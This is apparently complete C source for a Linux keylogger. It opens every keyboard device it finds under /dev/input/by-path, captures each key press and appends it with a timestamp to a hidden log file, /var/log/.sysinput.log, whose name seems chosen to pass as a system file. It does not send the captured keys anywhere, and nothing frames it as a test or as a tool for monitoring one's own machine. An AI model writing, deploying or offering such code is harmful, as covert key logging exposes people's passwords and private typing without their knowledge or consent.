#include <dirent.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define INPUT_PATH "/dev/input/by-path/"
#define LOG_FILE "/var/log/.sysinput.log"
#define MAX_DEVICES 16

struct Device {
  int fd;
  char realpath[PATH_MAX];
};
// Basic key map for common keys
const char *keycode_to_string(int code) {
  switch (code) {
  case KEY_A:
    return "A";
  case KEY_B:
    return "B";
  case KEY_C:
    return "C";
  case KEY_D:
    return "D";
  case KEY_E:
    return "E";
  case KEY_F:
    return "F";
  case KEY_G:
    return "G";
  case KEY_H:
    return "H";
  case KEY_I:
    return "I";
  case KEY_J:
    return "J";
  case KEY_K:
    return "K";
  case KEY_L:
    return "L";
  case KEY_M:
    return "M";
  case KEY_N:
    return "N";
  case KEY_O:
    return "O";
  case KEY_P:
    return "P";
  case KEY_Q:
    return "Q";
  case KEY_R:
    return "R";
  case KEY_S:
    return "S";
  case KEY_T:
    return "T";
  case KEY_U:
    return "U";
  case KEY_V:
    return "V";
  case KEY_W:
    return "W";
  case KEY_X:
    return "X";
  case KEY_Y:
    return "Y";
  case KEY_Z:
    return "Z";
  case KEY_1:
    return "1";
  case KEY_2:
    return "2";
  case KEY_3:
    return "3";
  case KEY_4:
    return "4";
  case KEY_5:
    return "5";
  case KEY_6:
    return "6";
  case KEY_7:
    return "7";
  case KEY_8:
    return "8";
  case KEY_9:
    return "9";
  case KEY_0:
    return "0";
  case KEY_SPACE:
    return "SPACE";
  case KEY_ENTER:
    return "ENTER";
  case KEY_ESC:
    return "ESC";
  case KEY_TAB:
    return "TAB";
  case KEY_BACKSPACE:
    return "BACKSPACE";
  case KEY_MINUS:
    return "-";
  case KEY_EQUAL:
    return "=";
  case KEY_LEFTBRACE:
    return "[";
  case KEY_RIGHTBRACE:
    return "]";
  case KEY_SEMICOLON:
    return ";";
  case KEY_APOSTROPHE:
    return "'";
  case KEY_GRAVE:
    return "`";
  case KEY_BACKSLASH:
    return "\\";
  case KEY_COMMA:
    return ",";
  case KEY_DOT:
    return ".";
  case KEY_SLASH:
    return "/";
  default:
    return NULL;
  }
}

void log_key_event(int code) {
  FILE *log = fopen(LOG_FILE, "a");
  if (!log)
    return;

  time_t now = time(NULL);
  const char *keyname = keycode_to_string(code);
  if (keyname)
    fprintf(log, "[%ld] Key: %s\n", now, keyname);
  else
    fprintf(log, "[%ld] Key code: %d\n", now, code);

  fclose(log);
}

int already_opened(const char *realpath, struct Device *devices, int count) {
  for (int i = 0; i < count; ++i) {
    if (strcmp(realpath, devices[i].realpath) == 0)
      return 1;
  }
  return 0;
}

int find_keyboard_devices(struct Device *devices, int max_devices) {
  DIR *dir = opendir(INPUT_PATH);
  struct dirent *entry;
  int count = 0;

  if (!dir)
    return -1;

  while ((entry = readdir(dir)) && count < max_devices) {
    if (strstr(entry->d_name, "-kbd")) {
      char fullpath[PATH_MAX];
      snprintf(fullpath, sizeof(fullpath), "%s%s", INPUT_PATH, entry->d_name);

      char resolved[PATH_MAX];
      if (!realpath(fullpath, resolved))
        continue;

      if (already_opened(resolved, devices, count))
        continue;

      int fd = open(resolved, O_RDONLY | O_NONBLOCK);
      if (fd < 0)
        continue;

      strncpy(devices[count].realpath, resolved, PATH_MAX);
      devices[count].fd = fd;
      count++;
    }
  }

  closedir(dir);
  return count;
}

int main() {
  struct Device devices[MAX_DEVICES];
  int num_devices = find_keyboard_devices(devices, MAX_DEVICES);

  if (num_devices <= 0) {
    fprintf(stderr, "No keyboard devices found :( \n");
    return 1;
  }

  fd_set readfds;
  struct input_event ev;
  while (1) {
    FD_ZERO(&readfds);
    int max_fd = 0;

    for (int i = 0; i < num_devices; ++i) {
      FD_SET(devices[i].fd, &readfds);
      if (devices[i].fd > max_fd)
        max_fd = devices[i].fd;
    }

    int ready = select(max_fd + 1, &readfds, NULL, NULL, NULL);
    if (ready < 0)
      break;

    for (int i = 0; i < num_devices; ++i) {
      if (FD_ISSET(devices[i].fd, &readfds)) {
        ssize_t n = read(devices[i].fd, &ev, sizeof(ev));
        if (n == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) {
          log_key_event(ev.code);
        }
      }
    }
  }

  for (int i = 0; i < num_devices; ++i)
    close(devices[i].fd);

  return 0;
}
